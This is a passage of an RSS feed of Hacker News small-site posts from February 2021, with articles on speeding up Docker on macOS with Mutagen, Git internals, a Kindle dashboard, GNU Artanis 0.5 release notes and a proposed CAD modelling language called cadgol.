(i.e. <a href="https://en.wikipedia.org/wiki/DDR4_SDRAM" rel="noopener">DDR4‚Äì3200 could be twice as fast as DDR4‚Äì1600</a>), and the multi-channel ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.inten.to/cpu-hardware-for-deep-learning-b91f53cb18af">https://blog.inten.to/cpu-hardware-for-deep-learning-b91f53cb18af</a></em></p>]]>
            </description>
            <link>https://blog.inten.to/cpu-hardware-for-deep-learning-b91f53cb18af</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135352</guid>
            <pubDate>Sun, 14 Feb 2021 19:27:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How To Speed up Docker on macOS by 100% or more]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135217">thread link</a>) | @DanHulton
<br/>
February 14, 2021 | https://nodewood.com/blog/how-to-speed-up-docker-on-macos/ | <a href="https://web.archive.org/web/*/https://nodewood.com/blog/how-to-speed-up-docker-on-macos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://nodewood.com/blog/content/images/size/w300/2021/02/marc-olivier-jodoin-NqOInJ-ttqM-unsplash.jpg 300w,
                            https://nodewood.com/blog/content/images/size/w600/2021/02/marc-olivier-jodoin-NqOInJ-ttqM-unsplash.jpg 600w,
                            https://nodewood.com/blog/content/images/size/w1000/2021/02/marc-olivier-jodoin-NqOInJ-ttqM-unsplash.jpg 1000w,
                            https://nodewood.com/blog/content/images/size/w2000/2021/02/marc-olivier-jodoin-NqOInJ-ttqM-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://nodewood.com/blog/content/images/size/w2000/2021/02/marc-olivier-jodoin-NqOInJ-ttqM-unsplash.jpg" alt="How To Speed up Docker on MacOS by 100% or more">
            </figure>

            <section>
                <div>
                    <p>Docker on MacOS will always be slower than on Linux (well, unless Apple Silicon ends up panning out, which it looks like it might!), but it doesn't have to be as <em>infuriatingly slow</em> as it is by default. &nbsp;In fact, you can get it pretty close to native speed and it's not even all that difficult. &nbsp;It turns out that developing with Docker on MacOS can actually be a really enjoyable experience, not just a compromise you make in order to have a portable development environment.</p><p>The problem is that the default file sync strategy that Docker on MacOS uses is <em>garbage.</em> &nbsp;Sure, it's consistent and compatible, but it's just about the slowest possible option you could go with. &nbsp;As your Docker app runs, it reads and changes files across that sync, which means that every file access slows down your application a little bit more. &nbsp;Compounded, that means that even your average runs are <em>bitterly slow</em>.</p><p>Enter Mutagen. &nbsp;Mutagen does a lot of things and is a very interesting technology in general, but what we're primarily interested in is how it can perform lightning-quick syncs between your local computer and a Docker volume. &nbsp;How fast is it? &nbsp;Well, the title of this article isn't hyperbole, in fact, it's underselling things. &nbsp;My Jest test suite went from taking 73.5 seconds to run to only taking 22.9 seconds (on average).</p><p>So now that we know what the problem is and what the solution is, let's fix Docker on MacOS.</p><p>First, you have to install Mutagen, and as of the writing of this article, you need to install a beta release. &nbsp;We need version 0.12.0 or higher, since that's the version that starts supporting <code>mutagen compose</code> (which we'll get to in a minute). &nbsp;There should be fairly low risk from this, though, since Mutagen's own website says:</p><blockquote><a href="https://mutagen.io/documentation/introduction/installation#development-channels">Beta channel releases are fairly stable and can be thought of as something akin to release candidates.</a></blockquote><p>To install Mutagen and start the sync daemon, first, make sure you have <a href="https://brew.sh/">Homebrew</a> installed, and then:</p><pre><code>$ brew install mutagen-io/mutagen/mutagen-beta
$ mutagen daemon start</code></pre><p>Next, you'll need to modify your <code>docker-compose.yml</code> file to define the sync that Mutagen will spin up. &nbsp;Assume your current <code>volumes</code> entry for a container looks like:</p><pre><code>    volumes:
      - .:/code</code></pre><p>You'll want to create a new section at the bottom of your file with an <code>x-mutagen</code> configuration. &nbsp;<code>mutagen compose</code> will read that and build your sync from the options you set there:</p><pre><code>x-mutagen:
  sync:
    defaults:
      ignore:
        vcs: true
      mode: "two-way-resolved"

    mount-code:
      alpha: "."
      beta: "volume://mount-code"</code></pre><p><code>alpha</code> is where you're syncing <em>from</em>, and <code>beta</code> is the sync mount point that Mutagen will create. &nbsp;Also of note is the <code>two-way-resolve</code> sync mode we're using. &nbsp;<a href="https://mutagen.io/documentation/synchronization#modes">Mutagen has great documentation on how its synchronization modes work</a>, but in short, we're using the mode that prioritizes host files. &nbsp;Since this is development and the files on the host system are the canonical ones anyway, this is safe and prevents conflicts that have to be manually resolved.</p><p>Finally, we have to update our <code>volumes</code> entry to use the new mount point:</p><pre><code>    volumes:
      - mount-code:/code</code></pre><p>And that's it! &nbsp;Well, that's <em>nearly</em> it. &nbsp;<code>docker-compose</code> doesn't know how to read an <code>x-mutagen</code> entry, so instead we now run this file with the <code>mutagen compose</code> command, which is essentially a pass-through to <code>docker-compose</code> after having performed the various sync setup steps you've defined.</p><p>The first time you run this will be longer than before, as Mutagen will need to create the sync mount and perform the initial synchronization, but then it will run as a daemon and keep changes automatically in sync. &nbsp;I have found that occasionally it will run wild with the CPU for a couple dozen seconds as it updates its index (or something), but it hasn't significantly affected my development, especially not when compared against the <em>incredible</em> speed upgrades it provides.</p><h2 id="using-mutagen-in-nodewood">Using Mutagen in Nodewood</h2><p>Now that you have an idea how Mutagen works and how to set it up for your average project, I wanted to provide explicit steps for using it in your Nodewood projects.</p><p>(If you've arrived at this article from another site, you might not know what <a href="https://nodewood.com/">Nodewood</a> is. &nbsp;Nodewood is a JavaScript SaaS starter kit designed to save weeks or months of time when building your next web app. &nbsp;It comes with user authentication &amp; management, subscriptions, and a Docker development environment that is both easy to set up, and ‚Äì thanks to Mutagen ‚Äì lightning-fast to use. &nbsp;Interested in using Nodewood to build your next SaaS app? &nbsp;<a href="https://nodewood.com/">Read more here</a>.)</p><p>There are two steps to using Mutagen in Nodewood: 1) Using an application-specific <code>docker-compose.yml</code> file, and modifying your <code>.nodewood.js</code> configuration file to use Mutagen. &nbsp;(Of course, you'll need to make sure you've already installed Mutagen according to the instructions above.)</p><h3 id="1-set-up-an-app-specific-docker-compose-yml-file">1) Set up an app-specific docker-compose.yml file</h3><p>Nodewood will use a file in the <code>app</code> folder before it will use a file in the <code>wood</code> folder, and this applies to your Docker files as well. &nbsp;Create a file in <code>app/docker/docker-compose.yml</code>, and paste the following:</p><pre><code>version: '3'

services:
  postgres:
    build:
      context: .
      dockerfile: ../../wood/docker/Dockerfile.postgres
    networks:
      - app-network
    environment:
      POSTGRES_PASSWORD: nodewood
      POSTGRES_MULTIPLE_DATABASES: "nodewood,test"
    expose:
      - 5432
    ports:
      - '5432:5432'
  ui:
    build:
      context: ../..
      dockerfile: wood/docker/Dockerfile
    env_file: ../../.env
    volumes:
      - nodewood-code:/nodewood
    command: yarn dev-ui
    ports:
      - '8888:8888'
  api:
    build:
      context: ../..
      dockerfile: wood/docker/Dockerfile
    networks:
      - app-network
    volumes:
      - nodewood-code:/nodewood
    ports:
      - '3000:3000'
    links:
      - postgres
    depends_on:
      - postgres
    command: yarn dev-api
  nginx:
    build:
      context: .
      dockerfile: ../../wood/docker/Dockerfile.nginx
    networks:
      - app-network
    ports:
      - '80:80'
      - '443:443'
    links:
      - api:api

networks:
  app-network:
    driver: bridge

volumes:
  nodewood-code:

x-mutagen:
  sync:
    defaults:
      ignore:
        vcs: true
      mode: "two-way-resolved"

    nodewood-code:
      alpha: "../.."
      beta: "volume://nodewood-code"
</code></pre><p>This will set up your Mutagen sync mount, and ensure that you're continuing to use the Dockerfiles for Nginx and Postgres that live in the <code>wood/docker</code> folder.</p><h3 id="2-modify-your-nodewood-configuration-file">2) Modify your Nodewood configuration file</h3><p>In your project root, you'll find a file called <code>.nodewood.js</code>. &nbsp;This file contains your Nodewood project information, including your keys that are used to authenticate with the Nodewood server when updating the library code. &nbsp;All you need to do is add the following two lines to the <code>exports</code> object:</p><pre><code>  composeCommand: 'mutagen',
  composeArgs: ['compose'],</code></pre><p>This will instruct the Nodewood CLI to use <code>mutagen compose</code> instead of <code>docker-compose</code> when starting your project for development or tests.</p><p><strong>NOTE: You will need to have v0.13.2 or later of the Nodewood CLI tool installed.</strong> &nbsp;You can update with <code>yarn global add @nodewood/cli</code>.</p><p>That's it! &nbsp;Some simple copy and paste, and your Nodewood development experience should be <em>dramatically</em> improved!</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://nodewood.com/blog/how-to-speed-up-docker-on-macos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135217</guid>
            <pubDate>Sun, 14 Feb 2021 19:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring How Git Works]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135215">thread link</a>) | @mr_o47
<br/>
February 14, 2021 | https://muhammadraza.me/2019/Exploring-Git/ | <a href="https://web.archive.org/web/*/https://muhammadraza.me/2019/Exploring-Git/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>As we all use git every day in our projects and it has made our lives easier by allowing us to collaborate with others more efficiently.Thus it helped us to produce great software that is impacting our lives every day.</p> <h3 id="what-is-git">What is Git?</h3> <p>In simplest terms Git is distributed version control system that allows us to keep track of our files and helps us collaborate with each other more efficiently while working on a software project. Git was created by Linus Torvalds in 2005 for development of the Linux kernel. It is primarily written in <code>C</code> and other languages such as <code>python</code>,<code>shell</code>, Perl<code> and </code>Tcl`.</p> <h3 id="lets-begin-exploring-git">Lets Begin Exploring Git</h3> <p>In order to begin I will start by creating a git repo named <code>test/</code></p> <ul> <li><code>git init test</code> command creates a local repo named <code>test</code> on our machine that contains <code>.git/</code> folder which contains all the metadata.</li> </ul> <div><div><pre><code>drwxr-xr-x  3 hackerman hackerman 4096 May 31 17:48 <span>.</span>
drwx--x--x 71 hackerman hackerman 4096 May 31 17:49 ..
drwxr-xr-x  7 hackerman hackerman 4096 May 31 17:49 .git
</code></pre></div></div> <p>In this blog, I will be focusing on <code>objects</code> and <code>ref</code> since they are the most important parts of <code>.git/</code> directory.</p> <div><div><pre><code>.git
‚îú‚îÄ‚îÄ branches
‚îú‚îÄ‚îÄ config
‚îú‚îÄ‚îÄ description
‚îú‚îÄ‚îÄ HEAD
‚îú‚îÄ‚îÄ hooks
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ applypatch-msg.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ commit-msg.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ fsmonitor-watchman.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ post-update.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-applypatch.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-commit.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-merge-commit.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ prepare-commit-msg.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-push.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-rebase.sample
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ pre-receive.sample
‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ update.sample
‚îú‚îÄ‚îÄ info
‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ exclude
‚îú‚îÄ‚îÄ objects
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ info
‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ pack
‚îî‚îÄ‚îÄ refs
    ‚îú‚îÄ‚îÄ heads
    ‚îî‚îÄ‚îÄ tags

9 directories, 16 files
</code></pre></div></div> <h3 id="how-git-actually-works">How Git Actually works</h3> <p>So I will be explaining how everything works under the hood using this simple diagram. As you can see we have three things <code>working directory</code>, <code>staging area</code> and <code>local repo</code>.</p> <p>When we run <code>git add</code> it creates a snapshot of our file that we are working on and put that file in the staging area and then we run <code>git commit</code> command which saves that snapshot of our file permanently in our local repo.</p> <h3 id="what-happens-when-we-run-git-add-filename">What happens when we run <code>git add &lt;filename&gt;</code></h3> <p><a href="https://postimg.cc/YLR17rs8"><img src="https://i.postimg.cc/c6yTQ6Mq/add.png" alt="add.png"></a></p> <p>When we run <code>git add</code> command it takes the files from the staging area and saves the file as a copy under <code>objects</code> directory. The file is represented as a blob (Binary Large Object) and that name of the file is generated using <code>SHA-1</code> hashing algorithm as it was calculated using the contents of the file.</p> <p>In this case it is represented by <code>f9cae9b</code> and the object can be seen by using the following command <code>git show --pretty=raw f9cae9b</code>.</p> <h3 id="what-happens-when-we-run-git-commit-filename">What happens when we run <code>git commit &lt;filename&gt;</code></h3> <p>When we run <code>git commit</code> it takes our file from staging and saves as a permanent snapshot in our local repo. When we run <code>git commit</code> command two more objects are created. <strong>A tree &amp; A commit</strong></p> <p>As you can tree is represented by <code>1be1fd</code></p> <p><a href="https://postimg.cc/BLygyQRF"><img src="https://i.postimg.cc/1XRj88Hv/tree.png" alt="tree.png"></a></p> <p>and commit is represented <code>fcae310</code>. furthermore, if you notice it also has a tree and it represents our directory structure.</p> <p><a href="https://postimg.cc/hQWmTJH2"><img src="https://i.postimg.cc/tJ7z0WDG/commit.png" alt="commit.png"></a></p> <p>If we run <code>git ls-tree &lt;tree&gt;</code> it prompts more us information about our tree and what type of files it contains.</p> <p><a href="https://postimg.cc/Fd7q7KSW"><img src="https://i.postimg.cc/Px4kVp5j/tree-info.png" alt="tree-info.png"></a></p> <p>So we have a file named <code>hello.txt</code> in our tree which is represented as a blob object which it refers to <code>f9cae9b</code>. moreover, file permissions are also tracked by git which is represented as <code>100644</code> in this case. Git is so intelligent that when we change our file name our raw data isn‚Äôt deleted but a new tree is created in our object, therefore, it allows us to change file names easily without losing raw data.</p> <p>Besides, <code>objects/</code> directory we also have <code>refs/</code> and this contains our branches. Branch name acts a reference to the commit. It contains a <code>SHA</code> that is pointing to our commit and it is automatically updated whenever we make a change and commit our file to the repo.</p> <p>So this is how Git works under the hood. Furthermore, Git uses a data structure called <a href="https://medium.com/girl-writes-code/git-is-a-directed-acyclic-graph-and-what-the-heck-does-that-mean-b6c8dec65059">Directed Acyclic Graph</a> and it‚Äôs really interesting to see how git works and how it has made collaboration easier for developers.</p> <p>I hope you enjoyed this post if you think i missed any thing feel free to dm me on <a href="https://twitter.com/">twitter</a> Feel to share it among your friends and colleagues.</p> <h5 id="interesting-links">Interesting Links</h5> <ul> <li><a href="https://www.youtube.com/watch?v=4XpnKHJAok8">Tech Talk: Linus Torvalds on git</a></li> <li><a href="https://www.linuxjournal.com/content/git-origin-story">Git Origin Story</a></li> </ul>  </div> </article>  </div></div>]]>
            </description>
            <link>https://muhammadraza.me/2019/Exploring-Git/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135215</guid>
            <pubDate>Sun, 14 Feb 2021 19:14:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make a life dashboard with an old Kindle (KT 4)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135077">thread link</a>) | @giuliomagnifico
<br/>
February 14, 2021 | https://www.davidhampgonsalves.com/life-dashboard/ | <a href="https://web.archive.org/web/*/https://www.davidhampgonsalves.com/life-dashboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Second hand Kindles are waiting in drawers for someone to repurpose them into something great. Boasting large e-ink screens, wifi connectivity and ARM processors they are an amazing hacking platform.</p>
<p>Check out the project <a href="https://github.com/davidhampgonsalves/life-dashboard">repository</a> for more details.</p>
<p><img src="https://davidhampgonsalves.com/images/life-dashboard-01.jpg"></p>
<p>In my case I created an information panel summarizing my day such as my calendar, surf and weather forecast, garbage schedule, school closures, etc. My favorite part is that any extra space is filled with a random Pok√©mon sprite which my kids(not me) like to come check in on.</p>
<h2 id="implementation">Implementation</h2>
<p>The project uses a serverless backend to collate data from external services and on the Kindle itself Rust code (cross compiled via docker) fetches and typesets the data into an image.</p>
<p>I could have avoided the backend of this project and only used the Kindle but I had already created it when I planned on using a dedicated e-ink display and it saved time to still use it.</p>
<h2 id="reusability">Reusability</h2>
<p>I built a stand rather then the more standard frame because the e-reader functionality of the Kindle is still present and can be picked up and used without modification. I also thought it was important to avoid obscuring the original device and celebrate its reuse.</p>
<h2 id="kindle-hacking-notes">Kindle Hacking Notes</h2>
<p>The <a href="https://www.mobileread.com/forums/">mobileread forum</a> is the place for mobile reader hacking.</p>
<p>My Kindle (KT 4) does not provide access to the RTC, but if I ever find a Kindle Paper White I would be able to sleep the device and run it unplugged for months between changes.</p>
<p><img src="https://davidhampgonsalves.com/images/life-dashboard-02.jpg"></p>
<p><img src="https://davidhampgonsalves.com/images/life-dashboard-03.jpg"></p>
<p><img src="https://davidhampgonsalves.com/images/life-dashboard-04.jpg"></p>

  </div></div>]]>
            </description>
            <link>https://www.davidhampgonsalves.com/life-dashboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135077</guid>
            <pubDate>Sun, 14 Feb 2021 19:02:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's news in GNU Artanis-0.5?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135051">thread link</a>) | @nalaginrut
<br/>
February 14, 2021 | https://nalaginrut.com/archives/2021/02/14/what%27s%20news%20in%20gnu%20artanis-0.5%3f | <a href="https://web.archive.org/web/*/https://nalaginrut.com/archives/2021/02/14/what%27s%20news%20in%20gnu%20artanis-0.5%3f">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><h4>What's news in GNU Artanis-0.5?</h4></p><div><p>Recently, I released GNU Artanis-0.5. Here's <a href="https://lists.gnu.org/archive/html/artanis/2021-02/msg00006.html" target="_blank">Relese Note</a>.</p><p>So what's news in it? We listed some notable changes here and ignore misc bugfixes.</p><h2>Support and only support Guile-3+</h2><p>The most notable news is that we support Guile-3 since Artanis-0.5. Guile-3 is a significant version because it contains better optimizatoins and JIT. However, Guile-3 has something incompatible with Guile-2. <a href="https://lists.gnu.org/archive/html/guile-devel/2020-09/msg00003.html" target="_blank">You may read more in my mail</a>. That is to say, you should not use Guile-2 anymore since Artanis-0.5.</p><h2>Support Network Security Services (NSS)</h2><p>I believe some people may ask the same question: why not GnuTLS?</p><p>Alright, we don't reject GnuTLS, but the current guile support in GnuTLS is dropped in some distros. I'm not going to write my own guile-gnutls wrapper. So I prefer to wait.</p><p>It's possible to support multi security libs if it's necessary. Fortunately, NSS has good coding quality and it is a nice option for our design in the long term.</p><p>In Artanis-0.5, libnss is only used for hashing algorithms. The hash functions (md5, sha, etc) are implemented in pure Scheme. Obviously, we have a better choice for efficiency and security to take advantage of existing industrial-level library.</p><p>In the future, we may add more features of crypto and security.</p><h2>Fix Ssql to adapt SQL standard</h2><p>Ssql is a feature to map s-expression to SQL string. We fix 2 issues according to SQL standard.</p><p><strong><em><u>String value should be single-quoted</u></em></strong></p><p>In SQL, the string should be single-quoted, not double-quoted, for example:</p><pre spellcheck="false">(<span>-&gt;sql</span> select * from <span>'Persons</span> (<span>where</span> (<span>/and</span> #:name <span>"john"</span> #:company <span>"lambadchip.com"</span>)))
</pre><p>And you should get the result:</p><pre spellcheck="false"><span>"select * from Persons where name='john' and company='lambadchip.com';"</span>
</pre><p><strong><em><u>Number value shouldn't be single-quoted</u></em></strong></p><pre spellcheck="false">(<span>-&gt;sql</span> select * from <span>'Persons</span> (<span>where</span> #:age <span>15</span>))
</pre><p>And you should get the result:</p><pre spellcheck="false"><span>"select * from Persons where age=15;"</span>
</pre><h2>Fix and enhance cookies</h2><p>In the current design of Artanis, these APIs are used for controling the cookies for the client.</p><p>The API only affects rc-set-cookie that handles new cookies from the server-side:</p><pre spellcheck="false"><span>:cookies-ref</span>
<span>:cookies-set!</span>
<span>:cookies-setattr!</span>
</pre><p>The API only affects rc-cookie that handles cookies of the client:</p><pre spellcheck="false"><span>:cookies-remove!</span>
<span>:cookies-check</span>
<span>:cookies-value</span>
</pre><p>You may use </p><pre spellcheck="false">(<span>get</span> <span>"/set"</span>
&nbsp;#:cookies '(names a)
&nbsp;(<span>lambda</span> (rc)
&nbsp;&nbsp;&nbsp;(<span>:cookies-set!</span> rc <span>'a</span> <span>"a"</span> <span>123</span>)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;(<span>:cookies-setattr!</span> rc <span>'a</span> #:path <span>"/test"</span>)
&nbsp;&nbsp;&nbsp;<span>"done"</span>))

(<span>get</span> <span>"/test"</span>
&nbsp;#:cookies '(names a)
&nbsp;(<span>lambda</span> (rc)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;(<span>:cookies-set!</span> rc <span>'a</span> <span>"a"</span> (<span>:cookies-value</span> rc <span>"a"</span>))
&nbsp;&nbsp;&nbsp;(<span>:cookies-setattr!</span> rc <span>'a</span> #:expires <span>21600</span> #:secure <span>#t</span>)
&nbsp;&nbsp;&nbsp;<span>"yes"</span>))
</pre><p>For more details, please read <a href="https://www.gnu.org/software/artanis/manual/manual.html#org19ef4c9" target="_blank">Artanis manual about cookies</a>.</p></div></div>]]>
            </description>
            <link>https://nalaginrut.com/archives/2021/02/14/what%27s%20news%20in%20gnu%20artanis-0.5%3f</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135051</guid>
            <pubDate>Sun, 14 Feb 2021 19:00:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cadgol ‚Äì a cad-native modeling language]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26135019">thread link</a>) | @todsacerdoti
<br/>
February 14, 2021 | https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html | <a href="https://web.archive.org/web/*/https://www.karimyaghmour.com/blog/2021/02/cadgol-a-cad-native-modeling-language.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry-6a0133f2f5dd98970b0278801543c5200d">
   <div>
			
	



	<div>
		<div>
			<p><em>[A copy of this blog is available on <a href="https://github.com/karimyaghmour/cadgol">github</a>]</em></p>

<p>Modeling real-world objects with computers traditionally requires using
graphical user interfaces to design, model and simulate such objects and their
interactions and reactions to external objects and forces. Such an approach is,
at first, intuitive since the designer is visually interacting and "crafting"
the object as they go. As explained by Jessie Frazelle
<a href="https://github.com/EmbeddedVentures/community">here</a>, there are limits to this
approach and there's a need for a programming-like language for the creation of
complex shapes using text-based entry similar to a software development
process.</p>

<p>Unfortunately, such a language doesn't presently exist. Or, at the very least,
the existing examples don't provide all the necessary constructs and
capabilities of their fully-featured graphical-based counterparts. Hence,
there's a need to design something that aims at providing the same level of
functionality as a modern CAD tool but based on programming-style paradigms.
But objects aren't software. While some of their features could be usefully
repeated using math-like software expressions, objects are infinitely more
complex in their variety and functionality. There is no "Von Neuman" model for
objects. Looking at traditional software languages alone is therefore not a very
good starting point.</p>

<p>If software alone won't cut then are there already languages and semantics
spaces that can be used to model things other than software? The immediate
obvious answer are RTL/HDL-languages such as Verilog and VHDL. They generally
comprise two types of construct: sequential and combinatorial circuits. They
somewhat look similar but synthesize into different constructs at the hardware
level ... which real physical structures as the final output in the case of ASIC
fabrication. That, though, isn't necessarily why HDLs are most interesting. The
more interesting thing about RTL is how we eventually got to how it's done
today.</p>

<p>Already in the '60s it appears there were attempts at describing hardware using
<a href="https://en.wikipedia.org/wiki/Hardware_description_language#History">software-like languages</a>.
The seminal work, though, seems to be Bell and Newell's 1971 "Computer
Structures: Readings and Examples". In this book, Bell and Newell catalog dozens
of processors and, most importantly, devise a language and notation to describe
those processors in a uniform fashion. They also introduce the term
"register-transfer level" which they define as "The components of an RT system
are registers and functional transfers between registers", which is precisely
what Verilog, VHDL and other modern-day HDLs do. The Instruction Set Processor
(ISP) notation which they describe in their book is then further refined in
further articles and used in the seminal "Introduction to VLSI Systems" by Meade
and Conway.</p>

<p>Now, why is that Bell and Newell so important to the present analysis? Well,
because what lands Bell and Newell to devise ISP is their need to catalog a very
wide variety of systems using a single descriptive language. Which then begs the
question. Is there are catalog of real-world objects that provides us with, if
nothing else, the proper semantic space to properly describe complex real-world
objects in a fashion that fully encompasses their functionality in the same was
a modern day CAD tool would?</p>

<p>It turns out that not only such a thing exists, but it's been being worked on
for a few hundred years and is likely one of the most important pillars of the
world economy. What could that possibly be you ask? Well, simply put,
... patents and, more specifically, the language of patent claims. The fact of
the matter is that in order to be granted, patent claims <strong>must</strong> describe an
invention, typically a real-world physically-structured object, in a
sufficiently unique fashion as to distinguish it from all previously-devised
objects, be they in patents or elsewhere. Consequently, an unimaginable amount
of human intellectual effort has been invested over time in elaborating and
evolving the precision and accuracy of patent claim language to describe all
features and structures of objects humans can envision. There is, therefore,
fertile ground in looking at patent claim language as the basis of a CAD-grade
descriptive language.</p>

<p>Which brings us the current proposal. Based on the needs and analysis above,
what is proposed is a C-like descriptive language that uses patent-claim-like
statements to describe real-world objects for the purpose of being "compiled",
simulated and otherwise processed by tools for enabling designers to create
and analyze the behavior of complex objects. This is, by its very nature, a
rough cut meant to elicit feedback and further discussion. There is likely much
work to be done in specifying semantics, conventions and validating the
usefulness and feasibility of such an approach. Nevertheless, here is what's
proposed as being "cadgol", a cad-native modeling language.</p>

<h2>cadgol example</h2>

<p>Let's start with a cadgol "Hello World!". Here's a mahogany chair in cadgol:</p>

<pre>/*
 * mohagony-chair.cgol
 *
 * A mohagony chair with 4 legs
 *
 * (C) Karim Yaghmour, 2021
 *
 * [ ASL ]
 */

/* The components we need and their local names */
comprises chair.leg as leg_fl, leg_fr, leg_bl, leg_br;
comprises chair.seat as main_seat;
comprises chair.back as main_back;

/* Material */
madeof wood.mohagony.honduran;

/* Fastners */
connector fastners.glue.wood.generic as glue;

/* Initialize component sizes */
leg_fl { dia: 1; height: 16 };
leg_fr { dia: 1; height: 16 };
leg_bl { dia: 1; height: 16 };
leg_br { dia: 1; height: 16 };
main_seat { width: 20; depth: 18, height: 1, leg_dia: 1 };
main_back { width: 10; depth: 1, height: 20 };

/* Assemble components */
assemblage {
    main_seat-&gt;leg-&gt;front-&gt;left  += glue(leg_fl);
    main_seat-&gt;leg-&gt;front-&gt;right += glue(leg_fr);
    main_seat-&gt;leg-&gt;back-&gt;left += glue(leg_bl);
    main_seat-&gt;leg-&gt;back-&gt;right += glue(leg_br);
    main_seat-&gt;back += glue(main_back);
}
</pre>

<p>The <code>comprises</code> statements here indicate the "library" components we are
including and the local instances of said components. There's presumably a
library called <code>chair</code> which has such things as <code>leg</code>, <code>seat</code> and <code>back</code>. Those
are assumed to be generic enough to be used in different chairs.</p>

<p>The <code>madeof</code> statement indicates the material this object is made of and is
assumed to come from a global library of materials. Materials likely provide the
object with color, mass, thermal conductivity, electrical connectivity, Young's
modulus, bending stiffness, etc. An individual object is likely made of a single
material (otherwise use the <code>composite.</code> library ;) ), although a complex object
could be made of several parts made of several differently-typed components. In
this case, the chair is made of Honduran Mahogany, and it's assumed that the
components included didn't themselves already have materials specified for
them. Hence, we can separate describing a part in mathematical terms from the
type of material that's used to make it.</p>

<p>The <code>connector</code> is whatever can be used to connect parts together. In this case
we're using glue as a fastener, and it's a generic wood glue. In a more complex
object we can imagine that other types of connectors could be used such as
welding, injection molding, etc.</p>

<p>Now that we've listed what parts are needed, what the present object is made of,
and the type of connectors used to put it together, we provide some specific
parameters about the components. In this case the description is provided as a
CSS-like set of values based on the types of parameters that can be used to
dictate the part's specifics.</p>

<p>Finally we assemble the object together by connecting the parts together based
on the anchors available for each part. The <code>+=</code> semantics are used to indicate
that it's possible that many objects may connect at a given anchoring
point/surface/axis. Think for example of an injection-molded part which has
many subparts being joined at a specific location.</p>

<p>That's the overall chair.</p>

<p>If we just take a look at the seat, it would look something like this:</p>

<pre>/*
 * chair/seat.cgol
 *
 * A generic chair seat for a chair with 4 legs and a back
 * ...
 */

/**
 * Seat model
 * @width:           seat width
 * @depth:           seat depth
 * @height:          seat height
 * @leg_dia:         leg diameter (assuming round pegs)
 *
 * Models a seat as a basic cube with round pegged legs
 *
 * Note: some variables are implicitly available in all "modeledas()"
 * functions. "anchor" is such a variable.
 */
modeledas(int width, int depth, int height, int leg_dia) {
    object o;
    surface s;
    contact c, r;
    int recess_x, recess_y;

    /* A very simple seat */
    o = cuboid(width, depth, height);

    /* Connectors for legs */
    s = o.bottom();
    c = circle(leg_diameter);
    recess_x = 0.1 * s.x_size;
    recess_y = 0.1 * s.y_size;
    anchor.add("leg-&gt;front-&gt;left") = planar_intersect(s, c, recess_x, recess_y);
    anchor.add("leg-&gt;front-&gt;right") = planar_intersect(s, c, s.x_size - recess_x, recess_y);
    anchor.add("leg-&gt;back-&gt;left") = planar_intersect(s, c, recess_x, s.y_size - recess_y);
    anchor.add("leg-&gt;back-&gt;right") = planar_intersect(s, c, s.x_size - recess_x, s.y_size - recess_y);

    /* Connectors for back */
    s = o.top();
    r = rectangle(x, 0.1 * y);
    anchor.add("back") = planar_intersect(s, r, 0, s.y_size);
}   
</pre>

<p>The <code>modeledas</code> statement takes parameters coming from the initialization of the
part and actually creates the part based on those parameters while also
specifying the anchors to be defined for connecting to this part.  In this case,
